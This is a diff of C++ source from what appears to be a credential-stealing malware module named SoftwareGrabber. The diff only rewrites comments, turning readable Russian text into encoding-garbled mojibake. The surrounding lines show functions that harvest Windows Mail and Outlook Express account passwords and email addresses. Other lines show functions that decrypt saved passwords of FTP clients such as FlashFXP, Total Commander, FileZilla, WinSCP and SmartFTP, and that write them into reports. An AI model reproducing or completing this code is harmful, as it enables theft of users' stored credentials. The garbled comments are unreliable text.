@@ -40,10 +40,10 @@
 #endif
 
 /*
-  Запись отчета.
+  Р—Р°РїРёСЃСЊ РѕС‚С‡РµС‚Р°.
 
-  IN OUT list   - данные для записи, буду освобождены после выхода из функции.
-  IN titleId    - заголовок отчета CryptedStrings::id_*.
+  IN OUT list   - РґР°РЅРЅС‹Рµ РґР»СЏ Р·Р°РїРёСЃРё, Р±СѓРґСѓ РѕСЃРІРѕР±РѕР¶РґРµРЅС‹ РїРѕСЃР»Рµ РІС‹С…РѕРґР° РёР· С„СѓРЅРєС†РёРё.
+  IN titleId    - Р·Р°РіРѕР»РѕРІРѕРє РѕС‚С‡РµС‚Р° CryptedStrings::id_*.
   IN reportType - BLT_*.
 */
 static void writeReport(LPWSTR list, DWORD titleId, DWORD reportType)
@@ -98,14 +98,14 @@ void SoftwareGrabber::_removeMacromediaFlashFiles(void)
 #if(BO_SOFTWARE_EMAIL > 0)
 
 /*
-  Перечесление всех писем из дирикторий Windows Mail.
+  РџРµСЂРµС‡РµСЃР»РµРЅРёРµ РІСЃРµС… РїРёСЃРµРј РёР· РґРёСЂРёРєС‚РѕСЂРёР№ Windows Mail.
   
   IN mimeAllocator    - IMimeAllocator.
   IN store            - IStoreNamespace.
-  IN currentFolder    - текущая директория.
-  IN OUT messageProps - переменная для экономии стека.
-  IN OUT folderProps  - переменная для экономии стека.
-  IN OUT list         - список для email'ов.
+  IN currentFolder    - С‚РµРєСѓС‰Р°СЏ РґРёСЂРµРєС‚РѕСЂРёСЏ.
+  IN OUT messageProps - РїРµСЂРµРјРµРЅРЅР°СЏ РґР»СЏ СЌРєРѕРЅРѕРјРёРё СЃС‚РµРєР°.
+  IN OUT folderProps  - РїРµСЂРµРјРµРЅРЅР°СЏ РґР»СЏ СЌРєРѕРЅРѕРјРёРё СЃС‚РµРєР°.
+  IN OUT list         - СЃРїРёСЃРѕРє РґР»СЏ email'РѕРІ.
 */
 static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, IStoreNamespace *store, IStoreFolder *currentFolder, MESSAGEPROPS *messageProps, FOLDERPROPS *folderProps, LPWSTR *list)
 {
@@ -196,31 +196,31 @@ void SoftwareGrabber::_emailWindowsMailRecipients(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Надстройка над IPropertyContainer::GetPropSz() для получения Unicode-строки.
+  РќР°РґСЃС‚СЂРѕР№РєР° РЅР°Рґ IPropertyContainer::GetPropSz() РґР»СЏ РїРѕР»СѓС‡РµРЅРёСЏ Unicode-СЃС‚СЂРѕРєРё.
 
-  IN account - аккаунт.
-  IN id      - ID опции.
+  IN account - Р°РєРєР°СѓРЅС‚.
+  IN id      - ID РѕРїС†РёРё.
 
-  Return     - строка, или NULL. Нужно освободить через Mem.
+  Return     - СЃС‚СЂРѕРєР°, РёР»Рё NULL. РќСѓР¶РЅРѕ РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· Mem.
 */
 static LPWSTR outlookExpressSzToUnicode(IImnAccount *account, DWORD id)
 {
-  char buffer[256/*Макс. размер согласно CCHMAX_*.*/];
+  char buffer[256/*РњР°РєСЃ. СЂР°Р·РјРµСЂ СЃРѕРіР»Р°СЃРЅРѕ CCHMAX_*.*/];
   if(account->GetPropSz(id, buffer, sizeof(buffer)) != S_OK)return NULL;
   return Str::_ansiToUnicodeEx(buffer, -1);
 }
 
 /*
-  Добавление данных сервера в отчет.
+  Р”РѕР±Р°РІР»РµРЅРёРµ РґР°РЅРЅС‹С… СЃРµСЂРІРµСЂР° РІ РѕС‚С‡РµС‚.
 
-  IN title      - заголовок.
-  IN account    - аккаунт.
+  IN title      - Р·Р°РіРѕР»РѕРІРѕРє.
+  IN account    - Р°РєРєР°СѓРЅС‚.
   IN serverId   - AP_*_SERVER.
   IN portId     - AP_*_PORT.
   IN sslId      - AP_*_SSL.
   IN userNameId - AP_*_USERNAME.
   IN passwordId - AP_*_PASSWORD.
-  OUT buffer    - буфер для данных.
+  OUT buffer    - Р±СѓС„РµСЂ РґР»СЏ РґР°РЅРЅС‹С….
 */
 static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, DWORD serverId, DWORD portId, DWORD sslId, DWORD userNameId, DWORD passwordId, LPWSTR *buffer)
 {
@@ -328,13 +328,13 @@ typedef struct
 }WINDOWSMAILDATA;
 
 /*
-  Получение строки из Windows Mail параметра.
+  РџРѕР»СѓС‡РµРЅРёРµ СЃС‚СЂРѕРєРё РёР· Windows Mail РїР°СЂР°РјРµС‚СЂР°.
 
-  IN root     - рутовый элемент.
-  IN title    - заголовок(префкс) элемента.
-  IN stringId - ID строки формата элемента.
+  IN root     - СЂСѓС‚РѕРІС‹Р№ СЌР»РµРјРµРЅС‚.
+  IN title    - Р·Р°РіРѕР»РѕРІРѕРє(РїСЂРµС„РєСЃ) СЌР»РµРјРµРЅС‚Р°.
+  IN stringId - ID СЃС‚СЂРѕРєРё С„РѕСЂРјР°С‚Р° СЌР»РµРјРµРЅС‚Р°.
 
-  Return      - строка, или NULL в случаи ошибки. Нужно освободить через _freeBstr().
+  Return      - СЃС‚СЂРѕРєР°, РёР»Рё NULL РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё. РќСѓР¶РЅРѕ РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· _freeBstr().
 */
 static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD stringId)
 {
@@ -347,16 +347,16 @@ static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD
 }
 
 /*
-  Добавление данных сервера в отчет.
+  Р”РѕР±Р°РІР»РµРЅРёРµ РґР°РЅРЅС‹С… СЃРµСЂРІРµСЂР° РІ РѕС‚С‡РµС‚.
 
-  IN title   - заголовок.
-  IN defaultPort - порт по умолчанию.
-  IN salt        - секрет пароля.
-  IN root        - рутовый элемент.
-  OUT buffer     - буфер для данных.
+  IN title   - Р·Р°РіРѕР»РѕРІРѕРє.
+  IN defaultPort - РїРѕСЂС‚ РїРѕ СѓРјРѕР»С‡Р°РЅРёСЋ.
+  IN salt        - СЃРµРєСЂРµС‚ РїР°СЂРѕР»СЏ.
+  IN root        - СЂСѓС‚РѕРІС‹Р№ СЌР»РµРјРµРЅС‚.
+  OUT buffer     - Р±СѓС„РµСЂ РґР»СЏ РґР°РЅРЅС‹С….
 
-  Return         - true - данные добавлены,
-                   false - данные не найдены.
+  Return         - true - РґР°РЅРЅС‹Рµ РґРѕР±Р°РІР»РµРЅС‹,
+                   false - РґР°РЅРЅС‹Рµ РЅРµ РЅР°Р№РґРµРЅС‹.
 */
 static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const DATA_BLOB *salt, IXMLDOMElement *root, LPWSTR *buffer)
 {
@@ -429,7 +429,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
 }
 
 /*
-  Обработка XML-файла с аккаунтом Winodws Mail.
+  РћР±СЂР°Р±РѕС‚РєР° XML-С„Р°Р№Р»Р° СЃ Р°РєРєР°СѓРЅС‚РѕРј Winodws Mail.
 */
 static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
 {
@@ -721,7 +721,7 @@ void SoftwareGrabber::_emailWindowsContacts(void)
           
           WDEBUG1(WDDT_INFO, "hr=0x%08X", hr);
 
-          if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Буфер мал.*/ || hr == S_FALSE /*Параметр пустой*/)continue;
+          if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Р‘СѓС„РµСЂ РјР°Р».*/ || hr == S_FALSE /*РџР°СЂР°РјРµС‚СЂ РїСѓСЃС‚РѕР№*/)continue;
 
           break; //Usually ERROR_PATH_NOT_FOUND.
         }
@@ -772,12 +772,12 @@ typedef struct
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
-  IN sectionName - имя секции. Не может быть нулевой.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
+  IN sectionName - РёРјСЏ СЃРµРєС†РёРё. РќРµ РјРѕР¶РµС‚ Р±С‹С‚СЊ РЅСѓР»РµРІРѕР№.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
 {
@@ -821,10 +821,10 @@ static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
 
 bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.*/
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.*/
 static void ftpFlashFxp3BasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_flashfxp_file_1);
@@ -929,12 +929,12 @@ void SoftwareGrabber::_ftpFlashFxp3(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 #if(0)
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
-  IN sectionName - имя секции. Не может быть нулевой.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
+  IN sectionName - РёРјСЏ СЃРµРєС†РёРё. РќРµ РјРѕР¶РµС‚ Р±С‹С‚СЊ РЅСѓР»РµРІРѕР№.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
 {
@@ -977,10 +977,10 @@ static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
 
 bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.*/
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.*/
 static void ftpCuteFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   const LPWSTR files[] = {L"sm.dat", L"tree.dat", L"smdata.dat"};
@@ -1053,11 +1053,11 @@ static unsigned long randTotalCommander(unsigned long *seed, unsigned long val)
 }  
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpTotalCommanderDecrypt(LPWSTR pass)
 {
@@ -1102,10 +1102,10 @@ static int ftpTotalCommanderDecrypt(LPWSTR pass)
 
 bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.  IN recrusive   - СЂРµРєСЂСѓСЃРёРІРЅС‹Р№ РїРѕРёСЃРє.
 */
 static void ftpTotalCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData, bool recrusive)
 {
@@ -1229,11 +1229,11 @@ void SoftwareGrabber::_ftpTotalCommander(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpWsFtpDecrypt(LPWSTR pass)
 {
@@ -1243,10 +1243,10 @@ static int ftpWsFtpDecrypt(LPWSTR pass)
 
 bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.  IN recrusive   - СЂРµРєСЂСѓСЃРёРІРЅС‹Р№ РїРѕРёСЃРє.
 */
 static void ftpWsFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
@@ -1352,10 +1352,10 @@ void SoftwareGrabber::_ftpWsFtp(void)
 
 bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.*/
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.*/
 static void ftpFileZillaBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_filezilla_file_mask_1);
@@ -1457,11 +1457,11 @@ void SoftwareGrabber::_ftpFileZilla(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль. Буфер должен иметь размер не менее MAX_ITEM_SIZE.
+  IN OUT pass    - РїР°СЂРѕР»СЊ. Р‘СѓС„РµСЂ РґРѕР»Р¶РµРЅ РёРјРµС‚СЊ СЂР°Р·РјРµСЂ РЅРµ РјРµРЅРµРµ MAX_ITEM_SIZE.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpFarManagerDecrypt(LPWSTR pass)
 {
@@ -1540,12 +1540,12 @@ void SoftwareGrabber::_ftpFarManager(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass        - пароль.
-  IN hostAndUserSize - сумма длин пароля и имени.
+  IN OUT pass        - РїР°СЂРѕР»СЊ.
+  IN hostAndUserSize - СЃСѓРјРјР° РґР»РёРЅ РїР°СЂРѕР»СЏ Рё РёРјРµРЅРё.
 
-  Return             - размер пароля.
+  Return             - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpWinScpDecrypt(LPWSTR pass, int hostAndUserSize)
 {
@@ -1664,11 +1664,11 @@ void ftpFtpCommanderMarkStringEnd(LPSTR string)
 }
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpFtpCommanderDecrypt(LPSTR pass)
 {
@@ -1682,10 +1682,10 @@ static int ftpFtpCommanderDecrypt(LPSTR pass)
 
 bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.*/
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.*/
 static void ftpFtpCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_fc_file_1);
@@ -1789,11 +1789,11 @@ void SoftwareGrabber::_ftpFtpCommander(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - РїР°СЂРѕР»СЊ.
 
-  Return         - размер пароля.
+  Return         - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpCoreFtpDecrypt(LPWSTR pass)
 {
@@ -1865,11 +1865,11 @@ void SoftwareGrabber::_ftpCoreFtp(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  Р”РµРєСЂСѓРїС‚РѕСЂ РїР°СЂРѕР»СЏ.
 
-  IN OUT pass - пароль.
+  IN OUT pass - РїР°СЂРѕР»СЊ.
 
-  Return      - размер пароля.
+  Return      - СЂР°Р·РјРµСЂ РїР°СЂРѕР»СЏ.
 */
 static int ftpSmartFtpDecrypt(LPWSTR pass)
 {
@@ -1899,10 +1899,10 @@ static int ftpSmartFtpDecrypt(LPWSTR pass)
 
 bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*В В Standard search.
+/*Р’В Р’В Standard search.
 
-В В IN path - the path.
-В В IN OUT ftpData - search data.*/
+Р’В Р’В IN path - the path.
+Р’В Р’В IN OUT ftpData - search data.*/
 static void ftpSmartFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_smartftp_file_mask_1);
